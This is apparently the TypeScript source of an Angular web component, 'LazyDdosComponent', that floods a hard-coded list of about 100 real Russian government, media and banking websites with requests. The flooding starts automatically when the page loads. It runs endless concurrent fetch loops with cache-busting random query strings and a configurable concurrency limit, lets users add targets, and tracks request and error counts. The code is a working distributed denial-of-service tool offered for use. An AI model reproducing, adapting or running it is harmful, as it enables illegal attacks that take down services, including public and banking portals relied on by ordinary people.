import {Component, OnInit} from '@angular/core';
import {KeyValue} from "@angular/common";
import {FormControl} from "@angular/forms";
import {LazyDdosStats} from "./lazy-ddos.types";

@Component({
  selector: 'app-lazy-ddos',
  templateUrl: './lazy-ddos.component.html',
  styleUrls: ['./lazy-ddos.component.scss']
})
export class LazyDdosComponent implements OnInit {

  concurrencylimit = CONCURRENCY_LIMIT;
  stats = printStats;
  targets = targets;

  concurrencyLimitFormControl = new FormControl();
  targetFormControl = new FormControl();

  constructor() {
  }

  ngOnInit(): void {
    targets.forEach(keyValue => {
      flood(keyValue.key, keyValue);
    });
  }

  updateConcurrencyLimit() {
    this.concurrencylimit = CONCURRENCY_LIMIT = this.concurrencyLimitFormControl.value;
  }

  updateTargets() {
    let newTarget: KeyValue<string, LazyDdosStats> = {
      key: this.targetFormControl.value,
      value: {number_of_requests: 0, number_of_errored_responses: 0}
    };
    targets.unshift(newTarget);
    flood(newTarget.key, newTarget);

  }

  exportTargets() {
    const urls = targets.map(a => a.key + '\n');
    const blob = new Blob(urls, {type: 'text'});
    const url = window.URL.createObjectURL(blob);
    window.open(url);
  }
}

const initStats: LazyDdosStats = {number_of_requests: 0, number_of_errored_responses: 0};
setInterval(printStats, 1000);
let targets: KeyValue<string, LazyDdosStats>[] = [
  {key: 'https://lenta.ru/', value: initStats},
  {key: 'https://ria.ru/', value: initStats},
  {key: 'https://ria.ru/lenta/', value: initStats},
  {key: 'https://www.rbc.ru/', value: initStats},
  {key: 'https://www.rt.com/', value: initStats},
  {key: 'http://kremlin.ru/', value: initStats},
  {key: 'http://en.kremlin.ru/', value: initStats},
  {key: 'https://smotrim.ru/', value: initStats},
  {key: 'https://tass.ru/', value: initStats},
  {key: 'https://tvzvezda.ru/', value: initStats},
  {key: 'https://vsoloviev.ru/', value: initStats},
  {key: 'https://www.1tv.ru/', value: initStats},
  {key: 'https://www.vesti.ru/', value: initStats},
  {key: 'https://online.sberbank.ru/', value: initStats},
  {key: 'https://sberbank.ru/', value: initStats},
  {key: 'http://ach.gov.ru/', value: initStats},
  {key: 'http://www.customs.ru/', value: initStats},
  {key: 'http://www.economy.gov.ru/', value: initStats},
  {key: 'http://www.fas.gov.ru/', value: initStats},
  {key: 'http://www.fedsfm.ru/', value: initStats},
  {key: 'http://www.gks.ru/', value: initStats},
  {key: 'http://www.minfin.ru/', value: initStats},
  {key: 'http://www.nalog.ru/', value: initStats},
  {key: 'http://www.rosreestr.ru/', value: initStats},
  {key: 'http://www.rosreserv.ru/', value: initStats},
  {key: 'https://gosbar.gosuslugi.ru/', value: initStats},
  {key: 'http://cikrf.ru/', value: initStats},
  {key: 'http://council.gov.ru/', value: initStats},
  {key: 'http://duma.gov.ru/', value: initStats},
  {key: 'http://government.ru/', value: initStats},
  {key: 'http://open.gov.ru/', value: initStats},
  {key: 'http://www.gusp.gov.ru/', value: initStats},
  {key: 'http://www.udprf.ru/', value: initStats},
  {key: 'http://fapmc.ru/', value: initStats},
  {key: 'http://rkn.gov.ru/', value: initStats},
  {key: 'http://www.fso.gov.ru/', value: initStats},
  {key: 'http://www.gfs.ru/', value: initStats},
  {key: 'http://www.rossvyaz.ru/', value: initStats},
  {key: 'https://digital.gov.ru/', value: initStats},
  {key: 'http://fstec.ru/', value: initStats},
  {key: 'http://rs.gov.ru/', value: initStats},
  {key: 'http://www.fsvts.gov.ru/', value: initStats},
  {key: 'http://www.mid.ru/', value: initStats},
  {key: 'http://www.russiatourism.ru/', value: initStats},
  {key: 'http://ombudsmanrf.org/', value: initStats},
  {key: 'http://www.rosmintrud.ru/', value: initStats},
  {key: 'http://www.rostrud.ru/', value: initStats},
  {key: 'http://archives.ru/', value: initStats},
  {key: 'http://fsa.gov.ru/', value: initStats},
  {key: 'http://www.gost.ru/', value: initStats},
  {key: 'http://fadm.gov.ru/', value: initStats},
  {key: 'http://obrnadzor.gov.ru/', value: initStats},
  {key: 'http://www.federalspace.ru/', value: initStats},
  {key: 'http://www.mkrf.ru/', value: initStats},
  {key: 'http://www.rupto.ru/', value: initStats},
  {key: 'https://edu.gov.ru/', value: initStats},
  {key: 'https://minobrnauki.gov.ru/', value: initStats},
  {key: 'http://minvostokrazvitia.ru/', value: initStats},
  {key: 'http://mil.ru/', value: initStats},
  {key: 'http://nac.gov.ru/', value: initStats},
  {key: 'http://svr.gov.ru/', value: initStats},
  {key: 'http://www.fsb.ru/', value: initStats},
  {key: 'http://www.mchs.gov.ru/', value: initStats},
  {key: 'http://www.scrf.gov.ru/', value: initStats},
  {key: 'http://rosavtodor.ru/', value: initStats},
  {key: 'http://www.favt.ru/', value: initStats},
  {key: 'http://www.mintrans.ru/', value: initStats},
  {key: 'http://www.morflot.ru/', value: initStats},
  {key: 'http://www.rostransnadzor.ru/', value: initStats},
  {key: 'http://www.roszeldor.ru/', value: initStats},
  {key: 'http://fsin.su/', value: initStats},
  {key: 'http://genproc.gov.ru/', value: initStats},
  {key: 'http://ksrf.ru/', value: initStats},
  {key: 'http://mvd.ru/', value: initStats},
  {key: 'http://rosgvard.ru/', value: initStats},
  {key: 'http://www.fssprus.ru/', value: initStats},
  {key: 'http://www.minjust.ru/', value: initStats},
  {key: 'https://xn--b1ab2a0a.xn--b1aew.xn--p1ai/', value: initStats},
  {key: 'http://rpn.gov.ru/', value: initStats},
  {key: 'http://voda.mnr.gov.ru/', value: initStats},
  {key: 'http://www.fishcom.ru/', value: initStats},
  {key: 'http://www.fsvps.ru/', value: initStats},
  {key: 'http://www.gosnadzor.ru/', value: initStats},
  {key: 'http://www.mcx.ru/', value: initStats},
  {key: 'http://www.meteorf.ru/', value: initStats},
  {key: 'http://www.mnr.gov.ru/', value: initStats},
  {key: 'http://www.rosleshoz.gov.ru/', value: initStats},
  {key: 'http://www.rosnedra.gov.ru/', value: initStats},
  {key: 'http://fmbaros.ru/', value: initStats},
  {key: 'http://rosminzdrav.ru/', value: initStats},
  {key: 'http://rospotrebnadzor.ru/', value: initStats},
  {key: 'http://www.minsport.gov.ru/', value: initStats},
  {key: 'http://www.roszdravnadzor.ru/', value: initStats},
  {key: 'http://minenergo.gov.ru/', value: initStats},
  {key: 'http://www.minpromtorg.gov.ru/', value: initStats},
  {key: 'http://www.minstroyrf.ru/', value: initStats},
  {key: 'http://data.gov.ru/', value: initStats},
  {key: 'http://partners.gosuslugi.ru/', value: initStats},
  {key: 'http://www.gosuslugi.ru/', value: initStats},
];

function printStats() {
  return JSON.stringify(targets, null, 2)
}

let CONCURRENCY_LIMIT = 70;
var queue: Promise<void>[] = [];

async function fetchWithTimeout(resource: RequestInfo, options: { timeout: any; }) {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), options.timeout);
  return fetch(resource, {
    signal: controller.signal
  }).then((response) => {
    clearTimeout(id);
    return response;
  }).catch((error) => {
    clearTimeout(id);
    throw error;
  });
}

async function flood(target: string | number, full: KeyValue<string, any>) {
  for (var i = 0; ; ++i) {
    if (queue.length > CONCURRENCY_LIMIT) {
      await queue.shift()
    }
    let rand;
    rand = i % 13 === 0 ? '' : ('?' + Math.floor(Math.random() * 1000))
    queue.push(
      fetchWithTimeout(target + rand, {timeout: 5000})
        .catch((error) => {
          if (error.code === 20 /* ABORT */) {
            return;
          }
          let index = targets.indexOf(full) as number;
          targets[index].value.number_of_errored_responses++;
          targets[index].value.error_message = error.message
        })
        .then((response) => {
          let index = targets.indexOf(full) as number;
          if (response && !response.ok) {
            targets[index].value.number_of_errored_responses++;
            targets[index].value.error_message = response.statusText
          }
          targets[index].value.number_of_requests++;
        })
    )
  }
}
